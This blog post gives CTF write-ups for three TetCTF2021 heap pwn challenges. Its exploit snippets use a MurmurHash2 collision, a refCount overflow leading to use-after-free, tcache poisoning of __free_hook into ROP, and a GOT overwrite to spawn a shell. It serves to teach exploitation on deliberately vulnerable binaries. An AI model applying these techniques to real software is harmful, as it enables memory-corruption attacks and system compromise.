---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "[TetCTF2021] cache_v1, cache_v2, SimpleSystem writeups"
subtitle: ""
summary: "Writeups for TetCTF2021 heap pwn challenges"
authors: [midas]
tags: []
categories: []
date: 2021-01-03T04:48:09-08:00
lastmod: 2021-01-03T04:48:09-08:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---
All files can be found [here](https://github.com/LKMDang/Short-CTF-Writeups/tree/master/tetctf2021)

# cache_v1
## Introduction
- **Given files:** `cache`, `cache.cpp`, `libc-2.31.so`, `ld-2.31.so`.
- **Description:** `Flag stored in /home/cache/flag`
- **Category:** Pwnable (actually `crypwn`, to be exact)
- **Summary:** A `C++` glibc 2.31 heap challenge with `seccomp` rules that is very strict. We are given the source file for this challenge, so reverse engineering it is not a problem. The challenge also requires some math and crypto knowledge.

## TL;DR
1. Analyze the source code -> Found that the `caches` use the `name`'s `std::hash` as the key -> Maybe vulnearable to hash collision.
2. Find two names whose hashes collide -> Create a small cache first, then create a large one that collides with it will cause an out-of-bound read and write.
3. Setup the heap perfectly to exploit.
4. Use OOB read to leak `heap` and `libc`.
5. Use OOB write to poison tcache -> overwrite `__free_hook` into ROP to workaround `seccomp` and read the flag.
   
## Analyzing the source code
This program is a cache management system implemented in C++, it has the following functionalities:
- `Create` a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).
- `Read` data from a cache at an offset.
- `Write` data to a cache at an offset.
- `Erase` a cache.

The `create` cache option uses a global `unordered_map` called `caches` to keep track of created caches. It is indexed by a key which is the `std::hash<std::string>{}(name)` of the inputted `name`. This is maybe vulnearable to a hash collision attack, because if we can find two names that have the same hash, we can overlap a cache's size with another's:
```cpp
caches[std::hash<std::string>{}(name)].size = size;
```

Also, the cache's chunk to store the content on the heap is only created when we try to `write` into it, not when we `create` it, so we can write to a small cache to create a small chunk, then over write the size with the large one.

Because I couldn't find another vulnerability in the implementation, this is the path that I followed.

Also, this is the output of `seccomp-tools dump` on the binary:
```
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x07 0x00 0x40000000  if (A >= 0x40000000) goto 0011
0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012
0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
0007: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0012
0008: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0012
0009: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0012
0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
0011: 0x06 0x00 0x00 0x00000000  return KILL
0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

## Finding hash collision (crypto part)
I don't know much about math and cryptography, so I started googling to see which hashing algorithm does `C++` standard library use. It lead me to [this site](https://sites.google.com/site/murmurhash/), where most variances of `MurmurHash` is implemented. The version that `C++` standard library uses in a 64-bit environment is `MurmurHash2Unaligned`, which is implemented as `MurmurHash64A` in `MurmurHash2_64.cpp`.

More googling on how to collide this hash lead me to [this post](http://emboss.github.io/blog/2012/12/14/breaking-murmur-hash-flooding-dos-reloaded/), which shows in details how to create collided keys for `MurmurHash2`. The implementation of `MurmurHash2` in the blog post is almost identical to the one in `C++`, except some constants. I asked my team's crypto player `@pcback` to read it and try to re-implement it for me, and he came up with this script:
```python
INV_MAGIC = 0x5f7a0ea7e59b19bd
R = 16
MASK64 = 0xffffffffffffffff
DIFF = b"\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x80"
m = (0xc6a4a793 << 32) | 0x5bd1e995
h = (0xc70f6907 ^ (16 * m)) & (2**64 - 1)
r = 47

def unshiftRight(x, shift):
    res = x
    for i in range(64):
        res = x ^ res >> shift
    return res

def invert64(n):
    x = (n * 0x5f7a0ea7e59b19bd) & MASK64
    x = unshiftRight(x, r)
    x = (x * 0x5f7a0ea7e59b19bd) & MASK64
    return int.to_bytes(x, 8, 'little')

a = b'A'*16
b = bytes(x^y for x,y in zip(a,DIFF))

x1, x2 = int.from_bytes(a[:8], 'little'), int.from_bytes(a[8:], 'little')
y1, y2 = int.from_bytes(b[:8], 'little'), int.from_bytes(b[8:], 'little')

print((invert64(y1) + invert64(y2)).hex())
print((invert64(x1) + invert64(x2)).hex())
```
The script provides two strings whose hashes collide (hex-encoded):
```
c2c48614896beac4c2c48614896beac4
c2c4c9faed854236c2c4c9faed854236
```
With that in hands, I could continue with the exploit.

## Setup the heap
With the hash collision in hands, my plan was clear: Create a small cache, then collide it with a larger one to achieve out-of-bound read and write through that cache. The first step is to perfectly construct the heap so that I could read/write all the stuffs I need:
```python
# Create a small cache to collide on later
create(collide1, 0x30) 
write(collide1, 0, 8, "A"*8)

# Create victim caches to poison
create("victim1", 0x100) 
write("victim1", 0, 8, "B"*8)
create("victim2", 0x100) 
write("victim2", 0, 8, "C"*8)

# Create large cache to leak libc
create("leak", 0x2000) 
write("leak", 0, 8, "D"*8)

# Create padding cache to avoid consolidate
create("padd", 0x40) 
write("padd", 0, 8, "E"*8)

# Collide the first cache with a very large one
create(collide2, 0x2000) 
```

With the above setup, I have two small `victim` chunks to poison later, and a large chunk that will go into `unsorted bin` when freed to leak `libc`.

## Leak heap and libc
Simply read a heap pointer that is stored somewhere on the heap to leak `heap`, and free the large chunk to leak `libc`:
```python
# Leak heap
read(collide2, 0x40, 8)
heap = u64(r.recv(8)) - 0x144d0
log.info("heap: {}".format(hex(heap)))

# Erase large cache, leak libc
erase("leak")
read(collide2, 0x380, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
```

## Tcache poisoning
Freeing the two `victim` chunks and we can easily overwrite their `fd` pointer, classic `tcache poisoning`. With that, I now can overwrite `__free_hook` and also have all the leaked addresses in my hands. I could just use my ROP chain that I explained [here](https://blog.efiens.com/post/heap-seccomp-rop/) to read the flag. Note that the `payload` must be put into a cache's `name`, not `content`, because the `name` is what actually got `free()` first when we call `erase`.
```python
# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write(collide2, 0x200, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x124b0             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
... # read the full payload in my other post or my full script
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))

# Execute the chain
erase(payload)
```

The flag is:
```
TetCTF{https://www.youtube.com/watch?v=NvOHijJqups}
```

## Appendix
The MurmurHash2 implementation in `C++` standard library is `MurmurHash2.cpp`.

The script for finding hash collision is `collide.py`.

The full exploit is `a.py`.

# cache_v2
## Introduction
- **Given files:** `cache`, `cache.cpp`, `libc-2.31.so`, `ld-2.31.so`.
- **Description:** `Flag stored in /home/cache/flag`
- **Category:** Pwnable
- **Summary:** Another `C++` glibc 2.31 heap challenge that is the sequel to `cache_v1`. The source code is also given although the implementation of the system is different from `cache_v1`.

## TL;DR
1. Analyze the source code -> Found that there is a `uint8_t` integer overflow in `refCount`.
2. Create a large cache, duplicate it over and over to overflow `refCount`, then `erase` it -> `unique_ptr` will be deleted and the pointer it's managing will point to `tcache_perthread_struct` -> Can read and write (almost) anywhere on the heap with this.
3. Setup the heap perfectly to exploit.
4. Use OOB read to leak `heap` and `libc`.
5. Use OOB write to poison tcache -> overwrite `__free_hook` into ROP to workaround `seccomp` and read the flag.
   
## Analyzing the source code
This program is a cache management system implemented in C++, its functionalities is the same as `cache_v1`, with the addition of `Duplicate`:
- `Create` a cache with a unique name and (almost) arbitrary positive size (the upper bound is very high).
- `Read` data from a cache at an offset.
- `Write` data to a cache at an offset.
- `Erase` a cache.
- `Duplicate` a cache to another cache with different name, but similar content.

This time, there is no hashing to mess with. Also, the pointer to the content of each cache is now managed by C++ `unique_ptr`. In short, `unique_ptr` will manage a pointer inside itself, and uniquely own it. There is no way other smart pointers can refer to a pointer that a `unique_ptr` is managing.

When a cache is duplicated, the method `reference()` will be called to increase `refCount` by 1, and when it is erased, `release()` will be called to decrease `refCount` by 1. If `refCount` reaches 0, it means that the cache is no longer referred by any existing cache, therefore it will be deleted, along with its `unique_ptr`. There is a bound check that a cache on only be referenced upto `UINT8_MAX`, but here is the bug: the `refCount`'s data type itself is `uint8_t`, so it will never surpass that max, instead, it will `overflow` and go back to 0. Therefore, we can `duplicate` a cache 256 times to make `refCount` rolls back to 1, then `erase` it. Doing that leaves us with an erased cache that has a lot of duplicates referencing to it. This leads to a `use-after-free` bug upon accessing any of those duplicates.

## Erasing a cache with overflowed `refCount`
When we erase a cache, it's `unique_ptr` will also be erased. This structure is also stored on the heap,and the important part is that the pointer that it is managing is stored as the second `QWORD` of the struct. The `unique_ptr` struct is small enough that it will be inserted into `tcache` when it's free, and in `libc 2.31`, when a `tcache` is free, it's second `QWORD` will contain a so-called `key`, which is the pointer to `tcache_perthread_struct` at the start of the heap. Therefore, when we `.get()` from this freed `unique_ptr`, we actually have access to the pointer to that start of the heap. It all happens when we `erase` a large cache whose `refCount` is overflowed, and then we can read/write in a very large range from it. So effectively, we can read and write anywhere on the heap from that point.

## Setup the heap
Again, like `cache_v1`, we setup the heap perfectly for our exploitation, then overflow and erase a large cache:
```python
# Create a victim caches
create("victim1", 0x100)
write("victim1", 0, 8, "A"*8)
create("victim2", 0x100)
write("victim2", 0, 8, "B"*8)

# Create a large cache to duplicate over and over
create("orig", 0x18000)
write("orig", 0, 8, "A"*8)

# Duplicate orig 256 times
for i in range(256):
    #print(i)
    duplicate("orig", "dup_{}".format(i))

# Erase dup_0, orig's unique_ptr will now point at tcache_perthread_struct (top of heap)
erase("dup_0")
```

Notice that I created the `victim` caches first, because it will make them closer to the top, we don't want them to be far after those duplicated caches. The targeted cache size is also set to be very large (`0x18000`). Also, I deleted `dup_0` instead of `orig`, because `orig` is the only one that we can safely read and write from (it's not flagged as a duplicate).

## Leak heap and libc
Simply read a `heap` and a `libc` pointer on the heap, we don't even need to free a large chunk this time because the targeted chunk is already a large one and will be inserted to `unsorted bin`.
```python
# Leak heap
read("orig", 0x11ea8, 8)
heap = u64(r.recv(8)) - 0x11ed0
log.info("heap: {}".format(hex(heap)))

# Leak libc
read("orig", 0x12238, 8)
l.address = u64(r.recv(8)) - 0x1ebbe0
log.info("libc: {}".format(hex(l.address)))
```

## Tcache poisoning
Exactly the same as `cache_v1`: Freeing the two `victim` chunks and we can easily overwrite their `fd` pointer, classic `tcache poisoning`. With that, I now can overwrite `__free_hook` and also have all the leaked addresses in my hands. I could just use my ROP chain that I explained [here](https://blog.efiens.com/post/heap-seccomp-rop/) to read the flag. Note that the `payload` must be put into a cache's `name`, not `content`, because the `name` is what actually got `free()` first when we call `erase`.
```python
# Erase victims, overwrite victim2's fd to __free_hook
erase("victim1")
erase("victim2")
write("orig", 0x120b0, 8, p64(l.symbols["__free_hook"]))

# Build ROP payload
base = heap + 0x2d190             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
... # read the full payload in my other post or my full script
payload += b"/home/cache/flag"

# Create a cache with payload as its name
create(payload, 0x100)
write(payload, 0, 8, "A"*8)

# Overwrite __free_hook with call_gadget
create("free", 0x100)
write("free", 0, 8, p64(call_gadget))

# Execute the chain
erase(payload)
```

The flag is:
```
TetCTF{https://www.youtube.com/watch?v=RYhKUKzD6IQ}
```

## Appendix
The full exploit is `a.py`.

# SimpleSystem
## Introduction
- **Given files:** `SimpleSystem`, `libc-2.23.so`.
- **Category:** Pwnable
- **Hint**: `do you know an arena can be reused when arena list is full ?`
- **Summary:** A glibc 2.23 heap challenges that is very unique. It is a simple system (as the name suggest) that we can signup, signin and use its functionalities, it utilizes multithreading to implement them. The bug is in the synchronization implementation of multithreading, and the exploitation relies on how glibc handles `malloc()` on multithreaded environment (although there is another intended bug in the authentication process, but it is not needed).

## TL;DR
1. Analyze the executable -> Found that after signing in, if we go into sleep mode, then signout & delete, then signin again, we can signin to a deleted session due to a failed implementation of synchronization `semaphore`.
2. Create a lot of users, signin to 1 of them and use the above bug -> leak `libc` when `show_info`.
3. Signin to 8 others and put them to a long `sleep mode` -> Use maximum number of `heap arenas`.
4. Use the above bug on the 1st user again -> the `bk` pointer of an unsorted bin actually set the `is_admin` flag to `true`.
5. Create 7 notes to fill up the other `arenas` -> 8th note will be in `main arena` -> Overlap on `session` itself.
6. Overwrite `session->fullname` to leak `heap`.
7. Edit note to overwrite `session->head`, edit again to overwrite `atoi@GOT` into `system()`.
8. Input `sh` into choice prompt -> Get shell.
   
## Analyzing the binary
On startup, the program gives us 2 options:
- `Signup` to create an account. We will be asked for a `fullname`, a `username` and a `password`. If they are valid, the `username` will be used to create a directory underneath `creds` to store 2 files `u.dat` and `p.dat`, with `u.dat` storing the full name and `p.dat` storing the `MD5` hash of the `password`.
- `Signin` to signin to an account. The program will ask for the `username` and the `password` to check if they exist. If they do, it will lookup a `session list` to see if that user is currently having a session or not, if not, it will create a session for it. It also checks if the `username` is `admin` or not to set the `is_admin` flag. The `session` struct is as follows:
```c
struct str_session
{
    char padd[8];
    __int64 is_admin;
    __int64 sess_id;
    pthread_mutex_t mutex_lock;
    char* fullname;
    char username[0x30];
    __int64 note_id;
    str_note* head;
    str_note* tail;
}
```

*Note: Actually, as the author `@d4rkn3ss` reveals, there is a path truncation bug in the authentication process that can let you login to anything and read any file. With this you can leak every addresses through `/proc/self/maps`, leak `admin`'s hashed password to crack it, and leak the number of CPUs through `/proc/cpuinfo`. But I still managed to solve this without using this bug.*

After logging in, we have 6 options to choose from, each of these actions will be run on a separate thread, synchronized by a `mutex_lock` within each `session` and a global `semaphore`:
1. `Add` a note. This can only be performed as an `admin`, the note size can be up to `0xFFFF` and notes are stored as a linked list.
2. `Edit` a note. This also can only be performed as `admin`.
3. `Show` user info. This shows the user's fullname and notes.
4. `Sleep` mode. This puts the current thread to `sleep()` for the inputted amount of time (in seconds).
5. `Signout & delete`: signout of the current `session` and delete it, freeing everything its own.
6. `Signout`: signout of the current `session`, but still keep it in the `session list`.

This is the struct of a `note`:
```c
struct str_note
{
    str_note* next;
    __int64 size;
    char* content;
}
```

The bug here is that even though in `signout & delete` the program tries to acquire the `mutex_lock`, it doesn't call `sem_wait()` on the `semaphore` on the way out and goes straight into `sem_destroy()`. This way, if we go into `sleep mode`, the `mutex_lock` will be acquired, after that when we choose to `signout & delete`, this thread must wait for the sleeping thread to unlock its `mutex_lock` before it can execute, but the thing is on the main thread after `signout & delete`, it doesn't wait for the `semaphore` of the sleeping thread to be decremented before proceeding, therefore it will signout to the main menu on the *main thread*, while the *deleting thread* is still waiting for the `mutex_lock`. In short, we have 3 threads here:
- the *sleeping thread* holding the `mutex_lock`, incrementing the `semaphore`.
- the *deleting thread* waiting for `mutex_lock` to be released to proceed.
- the *main thread*, which should be waiting for the `semaphore`, is instead ignoring it and signout to main menu.

Using this bug, we can: `signin -> sleep -> signout & delete -> signin` to sign back into a deleted session. Notice that the `is_admin` flag in the `session` struct is located at the 2nd `QWORD`, it will be overwrited by the `bk` pointer of an unsorted bin, therefore we have a "fake" `admin` in this deleted session. Also the `fullname` chunk is freed, so we can `show` info to leak the `libc` address from it.
```python
# Leak libc with synchronization bug -> UAF
signin(user[0], user[0])
sleep_thread(1)
signout_delete()
signin(user[0], user[0])
show()
r.recvuntil("Your name: ")
l.address = u64(r.recv(6) + b'\0'*2) - 0x3c4b78
log.info("libc: {}".format(hex(l.address)))
```

## Exploit the multithreaded heap
The exploitation path is quite clear then: if we can `add` a note exactly the same size as a `session` struct, then it will be allocated add the freed `session` we are currently in and we can overwrite everything in it. But here is the big problem: Each thread will `malloc()` into its own `heap arena`, so initially, it seems like there are no way to `malloc()` into the `main arena` from another thread. 

That's when the **hint** comes in handy. By googling about this multithreading heap management stuff, I came into [this doc about MallocInternals](https://sourceware.org/glibc/wiki/MallocInternals). It says that the maximum number of heap arenas is `8 * #processors`. After all the arenas have been allocated, threads will try to reuse one of the other arenas. This is so nice because we can use `sleep mode` to create a lot of hanging threads, then try to `malloc()` into the `main arena` in the next (the author is nice enough to even make a call to `malloc()` in `sleep mode`). That's exactly what I did, even though the intended way is to read `/proc/cpuinfo` to know the number of processors, I just assumed that it's 1 and try it out (if it's not I could always bruteforce it, can't be too big anyway). Therefore I created 8 sleeping threads:
```python
# Fill all 8 created arenas with 8 notes
for i in range(1, 9):
    #print(i)
    signin(user[i], user[i])
    sleep_thread(i + 100)
    signout()
```

Now the next `malloc()` should be into the `main arena`, but not really. The way allocation works after filling the arenas is weird. I haven't read any resource about it yet, but as I experimented it, it seems like the program cycles through each of the arena on each thread to make new allocations. I'm not really sure about this, but what I did was doing trials-and-errors and I found that if I create 7 dummy notes, the 8th one will by in `main arena`, also set the note size to `0x90` to be the same as a `session` struct.
```python
# Fill all 8 created arenas with 8 notes
r.sendline("1")
r.sendlineafter("Size: \n", str(0x90))
r.sendafter("Content: \n", "0"*8) # note 0
for i in range(1, 8):
    add_note(0x90, chr(i)*8) # note 1 -> 7

# Next note will be in main arena, overwrite freed session -> overwrite full name to leak heap
payload1 = p64(0) + p64(1)
payload1 += p64(0) # sess_id
payload1 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload1 += p64(0x603190) # full name -> leak
add_note(0x90, payload1) # note 8
show()
r.recvuntil("Your name: ")
heap = u64(r.recv(4) + b'\0'*4) - 0x19f0
log.info("heap: {}".format(hex(heap)))
```

I used this note to overwrite `fullname` to a pointer to the `session list` (the binary has `No PIE`) to leak `heap` address. I also had to make sure that the other overwritten fields of `session` are acceptable by the process, especially the `mutex_lock` one.

## Overwrite GOT and get shell
Now I can use `edit` to overwrite `str_session->head` to the start of `session` struct, where I created a fake `note` whose `str_note->content` points to `atoi@GOT`. Then editting this note again to overwrite `atoi@GOT` to `system`. For the next prompt the make a choice to the options, I could just pass `sh` to it, then `atoi("sh")` will be called, which actually is `system("sh")` now.
```python
# Edit to point to atoi@GOTS
payload2 = p64(0) + p64(0x90)
payload2 += p64(b.got["atoi"]) # sess_id
payload2 += p64(2) + p64(0x100000eee) + p64(0)*3 # mutex lock
payload2 += p64(0) # full name
payload2 += p64(0)*6 # username
payload2 += p64(1) # note_id
payload2 += p64(heap + 0xe90) # head
payload2 += p64(heap + 0xe90) # tail
edit_note(0, payload2)

# Edit again to overwrite atoi@GOTS
edit_note(0, p64(l.symbols["system"]))

# Get shell
r.sendlineafter("choice: \n", "sh")
```

The flag is:
```
TetCTF{vina: *100*50421406550161#}
```

## Appendix
The full exploit is `a.py`.